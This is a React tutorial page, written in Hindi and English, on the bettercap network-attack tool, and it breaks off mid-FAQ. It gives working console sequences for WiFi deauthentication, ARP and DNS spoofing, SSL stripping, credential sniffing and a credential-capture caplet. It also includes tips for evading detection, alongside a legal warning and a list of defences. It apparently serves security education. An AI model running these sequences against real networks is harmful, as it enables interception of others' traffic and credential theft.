import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Bettercap() {
  return (
    <TutorialLayout
      title="bettercap"
      subtitle="नेटवर्क अटैक्स के लिए Swiss army knife — WiFi, BLE, Ethernet"
      icon="🦈"
      prev={{ to: '/tool/metasploit-framework', label: 'metasploit-framework' }}
      next={{ to: '/tool/wifite', label: 'wifite' }}
    >
      <h2>What is Bettercap?</h2>
      <p>
        Bettercap एक शक्तिशाली नेटवर्क सिक्योरिटी टूल है जो WiFi, Bluetooth Low Energy (BLE), और Ethernet नेटवर्क्स पर अटैक्स करने की क्षमता रखता है। यह MITM (Man-in-the-Middle) अटैक्स, पैकेट स्निफ़िंग, ARP स्पूफ़िंग, DNS स्पूफ़िंग, और नेटवर्क रेकन के लिए सबसे एडवांस्ड ओपन सोर्स टूल है। Ettercap का मॉडर्न विकल्प है और उससे कहीं ज़्यादा शक्तिशाली और तेज़ है। Penetration testers, red teamers, और network security researchers के लिए यह essential tool है।
      </p>
      <p>
        Bettercap Go भाषा में लिखा गया है जो इसे बहुत तेज़ और एफ़िशिएंट बनाता है। इसका इंटरैक्टिव कंसोल है जिसमें रियल-टाइम कमांड्स चला सकते हो। वेब UI भी है जिससे ब्राउज़र से कंट्रोल कर सकते हो। काली लिनक्स और काली नेटहंटर दोनों में प्री-इंस्टॉल्ड आता है। Bettercap Ettercap का रिप्लेसमेंट है और इसमें सब कुछ बिल्ट-इन है। यह cross-platform है — Linux, macOS, और Windows सब पर चलता है।
      </p>
      <p>
        Bettercap की सबसे बड़ी खासियत है इसका मॉड्यूलर आर्किटेक्चर। हर अटैक एक अलग मॉड्यूल है — WiFi, BLE, ARP, DNS, HTTP, net.sniff — सब अलग-अलग चालू/बंद कर सकते हो। कैपलेट्स (स्क्रिप्ट्स) बनाकर अटैक्स को ऑटोमेट कर सकते हो। यह पेनेट्रेशन टेस्टर्स, रेड टीमर्स, और नेटवर्क सिक्योरिटी रिसर्चर्स के लिए एसेंशियल टूल है।
      </p>
      <p>
        Bettercap v2 ने Ettercap को पूरी तरह replace कर दिया है। इसमें WiFi deauth attacks, BLE scanning, host discovery, HID attacks, और encrypted proxy सब built-in है। कैपलेट सिस्टम बहुत powerful है — एक फ़ाइल में पूरा attack workflow लिख सकते हो। वेब UI से रियल-टाइम में traffic देख सकते हो। JavaScript scripting से custom logic बना सकते हो।
      </p>
      <p>
        Bettercap v2 में कई नए फ़ीचर्स हैं — WiFi डीऑथ अटैक्स, BLE स्कैनिंग, होस्ट डिस्कवरी, HID अटैक्स, और एन्क्रिप्टेड प्रॉक्सी। इसका कैपलेट सिस्टम बहुत पावरफुल है — एक फ़ाइल में पूरा अटैक वर्कफ़्लो लिख सकते हो। वेब UI से रियल-टाइम में ट्रैफ़िक देख सकते हो। JavaScript स्क्रिप्टिंग से कस्टम लॉजिक बना सकते हो।
      </p>
      <p>
        Bettercap का इस्तेमाल रेड टीम ऑपरेशंस, नेटवर्क सिक्योरिटी ऑडिटिंग, और WiFi सिक्योरिटी टेस्टिंग में व्यापक रूप से होता है। यह टूल काली लिनक्स, पैरोट ओएस, और अन्य पेनेट्रेशन टेस्टिंग डिस्ट्रीब्यूशंस में प्री-इंस्टॉल्ड आता है। GitHub पर 16,000+ स्टार्स हैं और एक्टिव डेवलपमेंट जारी है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Bettercap केवल अपने नेटवर्क पर या अधिकृत पेनेट्रेशन टेस्टिंग में ही इस्तेमाल करें। MITM अटैक्स बिना अनुमति के अवैध हैं। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क इंटरसेप्शन में 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल शैक्षिक उद्देश्यों और लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of Bettercap</h2>
      <p>
        Bettercap को इटैलियन सिक्योरिटी शोधकर्ता Simone Margaritelli (evilsocket) ने 2018 में बनाया था। यह Ettercap का modern replacement है जो Go भाषा में लिखा गया है। उन्होंने Ettercap की कमज़ोरियों को देखते हुए पूरी तरह से नया टूल बनाने का फ़ैसला किया। Go भाषा में लिखने से परफ़ॉर्मेंस बहुत बेहतर हुई और क्रॉस-प्लेटफ़ॉर्म सपोर्ट भी मिला।
      </p>
      <p>
        Bettercap v2 में पूरा आर्किटेक्चर बदला गया — मॉड्यूलर डिज़ाइन, कैपलेट सिस्टम, वेब UI, और BLE सपोर्ट जोड़ा गया। 2019 में WiFi मॉड्यूल एड किया गया जिससे WiFi डीऑथ और डिसएसोसिएशन अटैक्स भी संभव हुए। आज Bettercap Kali Linux का डिफ़ॉल्ट MITM टूल है और GitHub पर 16,000+ स्टार्स हैं।
      </p>
      <p>
        Simone Margaritelli ने Bettercap बनाने से पहले कई और सिक्योरिटी टूल्स बनाए थे। उनका उद्देश्य था एक ऐसा MITM टूल बनाना जो modern हो, fast हो, और जिसमें सब कुछ बिल्ट-इन हो। Ettercap के साथ समस्या थी कि वो C में लिखा था, पुराना था, और WiFi/BLE सपोर्ट नहीं था। Bettercap ने यह सब हल किया।
      </p>
      <p>
        2020 में Bettercap v2.30+ में JavaScript scripting engine add हुआ जिससे कस्टम लॉजिक बनाना आसान हुआ। HID (Human Interface Device) अटैक्स भी add हुए — USB Rubber Ducky जैसे अटैक्स बिना हार्डवेयर के। 2021 में वेब UI में रियल-टाइम ट्रैफ़िक विज़ुअलाइज़ेशन add हुआ। 2022 में BLE अटैक्स और एम्यूलेशन सपोर्ट बेहतर हुआ। आज Bettercap MITM और नेटवर्क अटैक्स के लिए सबसे कम्प्लीट ओपन सोर्स टूल है।
      </p>

      <h2>How Bettercap Works?</h2>
      <p>
        Bettercap का आर्किटेक्चर मॉड्यूलर है — हर फ़ंक्शन एक अलग मॉड्यूल है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">ARP Spoofing Module:</strong> विक्टिम और गेटवे के बीच में आकर ट्रैफ़िक इंटरसेप्ट करता है। फ़ुल ड्यूप्लेक्स मोड में दोनों तरफ़ से पैकेट्स फ़ॉरवर्ड करता है</li>
        <li><strong className="text-white">DNS Spoofing Module:</strong> DNS रिस्पॉन्स मॉडिफ़ाई करके विक्टिम को गलत साइट पर रिडायरेक्ट करता है</li>
        <li><strong className="text-white">HTTP Proxy Module:</strong> HTTP/HTTPS ट्रैफ़िक इंटरसेप्ट और मॉडिफ़ाई करता है, SSL स्ट्रिपिंग सपोर्ट</li>
        <li><strong className="text-white">WiFi Module:</strong> WiFi नेटवर्क्स स्कैन, डीऑथ अटैक्स, डिसएसोसिएशन अटैक्स</li>
        <li><strong className="text-white">BLE Module:</strong> Bluetooth Low Energy डिवाइसेज़ स्कैन करता है</li>
        <li><strong className="text-white">Packet Sniffer (net.sniff):</strong> नेटवर्क ट्रैफ़िक कैप्चर और एनालाइज़ करता है, PCAP आउटपुट</li>
        <li><strong className="text-white">Host Discovery (net.probe):</strong> LAN में सभी लाइव होस्ट्स ढूंढता है</li>
        <li><strong className="text-white">Caplet Engine:</strong> स्क्रिप्ट्स से अटैक्स को ऑटोमेट करता है</li>
        <li><strong className="text-white">Web UI:</strong> ब्राउज़र से रियल-टाइम कंट्रोल और ट्रैफ़िक विज़ुअलाइज़ेशन</li>
        <li><strong className="text-white">JavaScript Engine:</strong> कस्टम JS स्क्रिप्ट्स से एडवांस्ड लॉजिक बना सकते हो</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Bettercap प्री-इंस्टॉल्ड आता है। अगर नहीं है तो कई तरीकों से इंस्टॉल कर सकते हो।
      </p>
      <CodeBlock
        title="Bettercap Installation"
        code={`# काली लिनक्स/नेटहंटर में चेक करें:
bettercap --version

# apt से इंस्टॉल:
sudo apt update
sudo apt install bettercap

# Go से इंस्टॉल (नवीनतम वर्जन):
go install github.com/bettercap/bettercap@latest

# Snap से:
sudo snap install bettercap

# Docker से:
docker pull bettercap/bettercap
docker run -it --net host bettercap/bettercap

# कैपलेट्स अपडेट करें:
sudo bettercap -eval "caplets.update"

# वर्जन और हेल्प:
bettercap --version
bettercap --help

# मॉड्यूल्स लिस्ट:
sudo bettercap -eval "help modules"`}
      />

      <h2>Basic Usage</h2>
      <p>
        Bettercap शुरू करने के कई तरीके हैं — इंटरैक्टिव कंसोल, वेब UI, या कैपलेट फ़ाइल।
      </p>
      <CodeBlock
        title="Bettercap शुरू करें"
        code={`# इंटरैक्टिव कंसोल:
sudo bettercap

# स्पेसिफ़िक इंटरफ़ेस के साथ:
sudo bettercap -iface wlan0

# वेब UI के साथ (ब्राउज़र से कंट्रोल):
sudo bettercap -caplet http-ui
# ब्राउज़र में खोलें: http://127.0.0.1:80

# कैपलेट फ़ाइल से रन करें:
sudo bettercap -caplet evil.cap

# डिबग मोड:
sudo bettercap -debug

# साइलेंट मोड:
sudo bettercap -silent

# हेल्प देखें:
sudo bettercap -eval "help"

# सभी मॉड्यूल्स:
sudo bettercap -eval "help modules"`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-iface</td><td className="py-2 px-3">नेटवर्क इंटरफ़ेस स्पेसिफ़ाई करें</td><td className="py-2 px-3 font-mono text-xs">-iface wlan0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-caplet</td><td className="py-2 px-3">कैपलेट फ़ाइल लोड करें</td><td className="py-2 px-3 font-mono text-xs">-caplet evil.cap</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-eval</td><td className="py-2 px-3">कमांड डायरेक्ट रन करें</td><td className="py-2 px-3 font-mono text-xs">-eval "net.probe on"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-debug</td><td className="py-2 px-3">डिबग मोड इनेबल</td><td className="py-2 px-3 font-mono text-xs">-debug</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-silent</td><td className="py-2 px-3">साइलेंट मोड (कोई आउटपुट नहीं)</td><td className="py-2 px-3 font-mono text-xs">-silent</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-no-colors</td><td className="py-2 px-3">कलर आउटपुट बंद</td><td className="py-2 px-3 font-mono text-xs">-no-colors</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-script</td><td className="py-2 px-3">JavaScript स्क्रिप्ट रन करें</td><td className="py-2 px-3 font-mono text-xs">-script my.js</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-env</td><td className="py-2 px-3">एनवायरमेंट वेरिएबल सेट करें</td><td className="py-2 px-3 font-mono text-xs">-env TERM=xterm</td></tr>
          </tbody>
        </table>
      </div>

      <h2>WiFi Reconnaissance</h2>
      <p>
        WiFi रेकन से आसपास के सभी वाईफ़ाई नेटवर्क्स और क्लाइंट्स की जानकारी मिलती है। USB WiFi adapter monitor mode support के साथ चाहिए।
      </p>
      <CodeBlock
        title="WiFi Scanning"
        code={`# Bettercap कंसोल में:

# WiFi रेकन इनेबल करें:
wifi.recon on

# WiFi नेटवर्क्स देखें:
wifi.show
# BSSID, ESSID, चैनल, एन्क्रिप्शन, सिग्नल स्ट्रेंथ सब दिखेगा

# स्पेसिफ़िक क्लाइंट को टार्गेट करें:
set wifi.deauth.target AA:BB:CC:DD:EE:FF

# डीऑथ अटैक (विक्टिम को डिसकनेक्ट करें):
wifi.deauth

# सभी क्लाइंट्स को डीऑथ:
wifi.deauth all

# चैनल बदलें:
wifi.recon channel 6

# WiFi रेकन बंद करें:
wifi.recon off

# Monitor mode setup (पहले):
sudo airmon-ng check kill
sudo airmon-ng start wlan0`}
      />

      <h2>ARP Spoofing (MITM Attack)</h2>
      <p>
        ARP स्पूफ़िंग से आप विक्टिम और राउटर के बीच में आ जाते हो। विक्टिम का सारा ट्रैफ़िक आपके थ्रू जाता है। यह सबसे कॉमन MITM अटैक है।
      </p>
      <CodeBlock
        title="ARP Spoof MITM"
        code={`# Bettercap कंसोल में:

# टार्गेट सेट करें (सिंगल IP):
set arp.spoof.targets 192.168.1.100

# कई टार्गेट्स:
set arp.spoof.targets 192.168.1.100,192.168.1.101

# पूरे सबनेट के लिए:
set arp.spoof.targets 192.168.1.0/24

# फ़ुल ड्यूप्लेक्स (दोनों तरफ़):
set arp.spoof.fullduplex on

# ARP स्पूफ़िंग शुरू:
arp.spoof on

# स्निफ़िंग इनेबल करें:
net.sniff on

# अब विक्टिम का सारा ट्रैफ़िक कैप्चर होगा
# HTTP, DNS, पासवर्ड्स सब दिखेंगे

# ARP स्पूफ़ बंद करें:
arp.spoof off`}
      />

      <h2>DNS Spoofing</h2>
      <p>
        DNS स्पूफ़िंग से विक्टिम को गलत वेबसाइट पर रिडायरेक्ट कर सकते हो। फ़िशिंग अटैक्स में बहुत उपयोगी है।
      </p>
      <CodeBlock
        title="DNS Spoof Setup"
        code={`# Bettercap कंसोल में:

# टार्गेट सेट करें:
set arp.spoof.targets 192.168.1.100

# DNS स्पूफ़िंग सेट करें:
set dns.spoof.domains target.com
set dns.spoof.address 192.168.1.50

# ARP स्पूफ़ शुरू (पहले यह ज़रूरी है):
arp.spoof on

# DNS स्पूफ़ शुरू:
dns.spoof on

# अब विक्टिम target.com खोलेगा तो 192.168.1.50 पर जाएगा

# सभी डोमेन्स के लिए:
set dns.spoof.domains *

# कई डोमेन्स:
set dns.spoof.domains target.com,example.com

# DNS स्पूफ़ बंद करें:
dns.spoof off`}
      />

      <h2>Packet Sniffing</h2>
      <p>
        पैकेट स्निफ़िंग से नेटवर्क ट्रैफ़िक कैप्चर किया जा सकता है। HTTP, DNS, FTP — सभी प्रोटोकॉल्स का ट्रैफ़िक देखा जा सकता है।
      </p>
      <CodeBlock
        title="Network Sniffing"
        code={`# Bettercap कंसोल में:

# स्निफ़िंग इनेबल करें:
net.sniff on

# वर्बोज़ आउटपुट:
set net.sniff.verbose true

# PCAP फ़ाइल में सेव करें:
set net.sniff.output capture.pcap

# HTTP रिक्वेस्ट्स कैप्चर:
set net.sniff.filter "tcp port 80"

# DNS क्वेरीज़ कैप्चर:
set net.sniff.filter "udp port 53"

# FTP कैप्चर:
set net.sniff.filter "tcp port 21"

# HTTPS (TLS हैंडशेक):
set net.sniff.filter "tcp port 443"

# सभी ट्रैफ़िक:
set net.sniff.filter ""

# स्निफ़िंग बंद करें:
net.sniff off`}
      />

      <h2>HTTP Proxy (SSL Strip)</h2>
      <p>
        HTTP प्रॉक्सी से HTTPS ट्रैफ़िक को HTTP में कन्वर्ट कर सकते हो (SSL स्ट्रिपिंग)। यह पुरानी लेकिन प्रभावी तकनीक है।
      </p>
      <CodeBlock
        title="HTTP Proxy Setup"
        code={`# Bettercap कंसोल में:

# टार्गेट सेट करें:
set arp.spoof.targets 192.168.1.100

# HTTP प्रॉक्सी इनेबल करें:
set http.proxy.sslstrip true
http.proxy on

# ARP स्पूफ़ शुरू करें:
arp.spoof on

# स्निफ़िंग शुरू करें:
net.sniff on

# अब विक्टिम का HTTPS ट्रैफ़िक HTTP में कन्वर्ट होगा
# लॉगिन क्रेडेंशियल्स प्लेनटेक्स्ट में दिखेंगे

# HTTP प्रॉक्सी बंद करें:
http.proxy off`}
      />

      <h2>Network Discovery</h2>
      <p>
        नेटवर्क डिस्कवरी से LAN में सभी लाइव होस्ट्स ढूंढ सकते हो।
      </p>
      <CodeBlock
        title="Network Scanning"
        code={`# Bettercap कंसोल में:

# होस्ट डिस्कवरी शुरू:
net.probe on

# लाइव होस्ट्स देखें:
net.show

# होस्ट्स की डिटेल्स:
net.show sort:ip
net.show sort:mac

# स्पेसिफ़िक होस्ट की जानकारी:
net.show 192.168.1.1

# होस्ट डिस्कवरी बंद:
net.probe off`}
      />

      <h2>BLE (Bluetooth) Recon</h2>
      <p>
        BLE रेकन से आसपास के Bluetooth Low Energy डिवाइसेज़ स्कैन किए जा सकते हैं।
      </p>
      <CodeBlock
        title="Bluetooth Scanning"
        code={`# Bettercap कंसोल में:

# BLE रेकन इनेबल करें:
ble.recon on

# BLE डिवाइसेज़ देखें:
ble.show

# BLE डिवाइसेज़ की जानकारी मिलेगी:
# नाम, एड्रेस, मैन्युफ़ैक्चरर, RSSI, UUIDs

# BLE रेकन बंद:
ble.recon off`}
      />

      <h2>Credential Sniffing</h2>
      <p>
        Bettercap से HTTP, FTP, और अन्य प्रोटोकॉल्स के क्रेडेंशियल्स कैप्चर कर सकते हो।
      </p>
      <CodeBlock
        title="Credential Capture"
        code={`# Bettercap कंसोल में:

# क्रेडेंशियल स्निफ़िंग इनेबल करें:
set net.sniff.verbose true

# ARP स्पूफ़ शुरू करें:
set arp.spoof.targets 192.168.1.100
arp.spoof on

# HTTP प्रॉक्सी (SSL strip) शुरू करें:
set http.proxy.sslstrip true
http.proxy on

# स्निफ़िंग शुरू करें:
net.sniff on

# अब HTTP लॉगिन फ़ॉर्म्स के क्रेडेंशियल्स दिखेंगे
# FTP पासवर्ड्स भी दिखेंगे
# DNS क्वेरीज़ भी दिखेंगे`}
      />

      <h2>Useful Caplets</h2>
      <p>
        कैपलेट्स प्री-रिटन स्क्रिप्ट्स हैं Bettercap के लिए। इनसे कॉमन अटैक्स आसानी से किए जा सकते हैं।
      </p>
      <CodeBlock
        title="Caplet Examples"
        code={`# evil.cap — क्रेडेंशियल कैप्चर:
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex on
set http.proxy.sslstrip true
http.proxy on
arp.spoof on
net.sniff on

# रन करें:
sudo bettercap -caplet evil.cap

# wifi-snoop.cap — WiFi मॉनिटरिंग:
wifi.recon on
wifi.show
set net.sniff.verbose true
net.sniff on

# ऑनलाइन कैपलेट्स डाउनलोड:
sudo bettercap -eval "caplets.update"
sudo bettercap -eval "caplets.show"

# कस्टम कैपलेट बनाएं:
# mycaplet.cap फ़ाइल में लिखो:
echo 'wifi.recon on' > mycaplet.cap
echo 'set arp.spoof.targets 192.168.1.100' >> mycaplet.cap
echo 'arp.spoof on' >> mycaplet.cap
echo 'net.sniff on' >> mycaplet.cap`}
      />

      <h2>Common Commands Summary</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wifi.recon on</td><td className="py-2 px-3">WiFi स्कैनिंग शुरू</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wifi.show</td><td className="py-2 px-3">WiFi नेटवर्क्स दिखाएं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wifi.deauth</td><td className="py-2 px-3">WiFi डीऑथ अटैक</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">arp.spoof on</td><td className="py-2 px-3">ARP स्पूफ़िंग (MITM)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dns.spoof on</td><td className="py-2 px-3">DNS स्पूफ़िंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">net.sniff on</td><td className="py-2 px-3">पैकेट स्निफ़िंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http.proxy on</td><td className="py-2 px-3">HTTP प्रॉक्सी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ble.recon on</td><td className="py-2 px-3">Bluetooth स्कैनिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">net.probe on</td><td className="py-2 px-3">नेटवर्क डिस्कवरी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">net.show</td><td className="py-2 px-3">लाइव होस्ट्स देखें</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">help</td><td className="py-2 px-3">सभी कमांड्स देखें</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Bettercap vs Ettercap vs mitmproxy</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Bettercap</th>
              <th className="text-left py-2 px-3 text-neon-green">Ettercap</th>
              <th className="text-left py-2 px-3 text-neon-green">mitmproxy</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">भाषा</td><td className="py-2 px-3">Go (तेज़)</td><td className="py-2 px-3">C (पुरानी)</td><td className="py-2 px-3">Python</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WiFi Support</td><td className="py-2 px-3">हाँ (डीऑथ, रेकन)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">BLE Support</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">वेब UI</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (mitmweb)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कैपलेट्स/स्क्रिप्टिंग</td><td className="py-2 px-3">हाँ (कैपलेट्स + JS)</td><td className="py-2 px-3">लिमिटेड</td><td className="py-2 px-3">Python addons</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ARP Spoofing</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">DNS Spoofing</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">मेंटेनेंस</td><td className="py-2 px-3">एक्टिव</td><td className="py-2 px-3">स्लो</td><td className="py-2 px-3">एक्टिव</td></tr>
            <tr><td className="py-2 px-3 text-white">परफ़ॉर्मेंस</td><td className="py-2 px-3">बहुत तेज़</td><td className="py-2 px-3">मीडियम</td><td className="py-2 px-3">मीडियम</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'इंटरफ़ेस नहीं मिल रहा', a: '-iface फ़्लैग से मैनुअली बताएं: sudo bettercap -iface wlan0। iwconfig से इंटरफ़ेस लिस्ट देखें।' },
          { q: 'MITM काम नहीं कर रहा', a: 'IP फ़ॉरवर्डिंग चेक करें: echo 1 > /proc/sys/net/ipv4/ip_forward। फ़ुल ड्यूप्लेक्स ऑन करें: set arp.spoof.fullduplex on' },
          { q: 'वेब UI नहीं खुल रहा', a: 'http-ui कैपलेट सही से लोड हो रहा है या नहीं चेक करें। ब्राउज़र में http://127.0.0.1:80 खोलें।' },
          { q: 'WiFi मॉड्यूल काम नहीं कर रहा', a: 'Monitor mode चाहिए। airmon-ng check kill करें पहले। फिर: airmon-ng start wlan0' },
          { q: 'DNS स्पूफ़िंग इफ़ेक्ट नहीं दिखा', a: 'ARP स्पूफ़ पहले शुरू करो (arp.spoof on), फिर DNS स्पूफ़। विक्टिम का DNS कैश क्लियर होना चाहिए।' },
          { q: 'SSL स्ट्रिपिंग काम नहीं कर रही', a: 'HSTS वाली साइट्स पर SSL स्ट्रिपिंग काम नहीं करती। सिर्फ़ HTTP साइट्स पर काम करेगा।' },
          { q: 'कैपलेट लोड नहीं हो रहा', a: 'फ़ाइल पाथ सही है या नहीं चेक करें। caplets.update से डिफ़ॉल्ट कैपलेट्स डाउनलोड करें।' },
          { q: 'ट्रैफ़िक नहीं दिख रहा', a: 'arp.spoof on पहले चालू करो, फिर net.sniff on। टार्गेट सही सेट है या नहीं चेक करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Bettercap MITM अटैक्स से कैसे बचें। नेटवर्क एडमिनिस्ट्रेटर्स को ये सभी defenses implement करनी चाहिए। एक भी defense missing हो तो attacker exploit कर सकता है। Defense in depth approach use करो — multiple layers of security।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Static ARP Entries:</strong> राउटर और सर्वर्स पर static ARP एंट्रीज़ सेट करें</li>
        <li><strong className="text-white">ARP Monitoring:</strong> ARP टेबल मॉनिटर करें — डुप्लिकेट MAC एड्रेसेज़ डिटेक्ट करें</li>
        <li><strong className="text-white">DHCP Snooping:</strong> स्विच पर DHCP snooping इनेबल करें</li>
        <li><strong className="text-white">Dynamic ARP Inspection:</strong> DAI इनेबल करें स्विच पर</li>
        <li><strong className="text-white">HTTPS Everywhere:</strong> HSTS और सर्टिफ़िकेट पिनिंग यूज़ करें</li>
        <li><strong className="text-white">VPN:</strong> VPN टनल से MITM से बच सकते हो</li>
        <li><strong className="text-white">WiFi Security:</strong> WPA3 यूज़ करें, ओपन वाईफ़ाई से बचें</li>
        <li><strong className="text-white">IDS/IPS:</strong> नेटवर्क पर IDS सिस्टम लगाएं — ARP anomalies detect करें</li>
        <li><strong className="text-white">Port Security:</strong> स्विच पर port security इनेबल करें</li>
        <li><strong className="text-white">Network Segmentation:</strong> VLANs से नेटवर्क सेगमेंट करें</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Bettercap practice के लिए सेफ़ लैब बनाओ। कभी भी production networks पर practice न करें। अपना isolated lab environment बनाओ जिसमें कई devices connected हों। Virtual machines, physical devices, और WiFi routers सब lab में use कर सकते हो।
      </p>
      <p>
        Lab में practice करते समय हर attack technique individually try करो — पहले ARP spoofing, फिर DNS spoofing, फिर SSL stripping। हर step को document करो ताकि बाद में review कर सको। Wireshark से traffic capture करो और analyze करो कि हर attack में packets कैसे modify हो रहे हैं।
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# ज़रूरी चीज़ें:
# 1. Kali Linux VM (या काली नेटहंटर)
# 2. टार्गेट डिवाइस (VM या फ़ोन)
# 3. राउटर (होम नेटवर्क)
# 4. USB WiFi adapter (monitor mode support)

# WiFi adapter monitor mode में डालो:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Bettercap शुरू करो:
sudo bettercap -iface wlan0mon

# या Ethernet से:
sudo bettercap -iface eth0

# Practice करो:
# 1. Network discovery (net.probe on, net.show)
# 2. ARP spoofing (arp.spoof on)
# 3. Packet sniffing (net.sniff on)
# 4. DNS spoofing (dns.spoof on)
# 5. WiFi recon (wifi.recon on)

# Practice targets:
# - अपना दूसरा डिवाइस (फ़ोन/टैबलेट)
# - Virtual machines
# - कभी भी दूसरों के नेटवर्क पर न करें`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Bettercap"
        code={`# कस्टम कैपलेट बनाएं — auto-mitm.cap:
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex on
set http.proxy.sslstrip true
set net.sniff.verbose true
set net.sniff.output /tmp/capture.pcap
http.proxy on
arp.spoof on
net.sniff on

# JavaScript स्क्रिप्टिंग:
# bettercap -eval "load('my_script.js')"

# WiFi Evil Twin:
# hostapd + bettercap combo
# फ़र्ज़ी AP बनाओ और MITM करो

# Multiple targets:
set arp.spoof.targets 192.168.1.100,192.168.1.101,192.168.1.102

# WiFi PMKID capture:
wifi.recon on
wifi.show
set wifi.handshakes.file /tmp/handshakes.pcap
wifi.deauth all

# Stealth mode:
set arp.spoof.fullduplex on
set net.sniff.verbose false
set arp.spoof.internal true`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Bettercap फ़्री है?', a: 'हाँ, पूरी तरह फ़्री और ओपन सोर्स (GPLv3)। कमर्शियल यूज़ भी फ़्री।' },
          { q: 'Ettercap से बेहतर है?', a: 'हाँ! Go में लिखा है (तेज़), WiFi/BLE सपोर्ट है, वेब UI है, कैपलेट सिस्टम है। Ettercap पुराना हो गया है।' },
          { q: 'WiFi अटैक्स कैसे करें?', a: 'USB WiFi adapter चाहिए (monitor mode support)। airmon-ng से monitor mode में डालो, फिर Bettercap में wifi.recon on करो।' },
          { q: 'वेब UI कैसे यूज़ करें?', a: 'sudo bettercap -caplet http-ui रन करो। ब्राउज़र में http://127.0.0.1:80 खोलो। Username/password डिफ़ॉल्ट: admin/admin' },
          { q: 'HSTS साइट्स पर काम करता है?', a: 'SSL स्ट्रिपिंग HSTS साइट्स पर काम नहीं करती। लेकिन ARP स्पूफ़िंग से ट्रैफ़िक मॉनिटर तो कर ही सकते हो।' },
          { q: 'डिटेक्ट होने से कैसे बचें?', a: 'स्लो रेट से ARP पैकेट्स भेजो। -silent मोड यूज़ करो। स्टील्थ कैपलेट्स यूज़ करो।' },
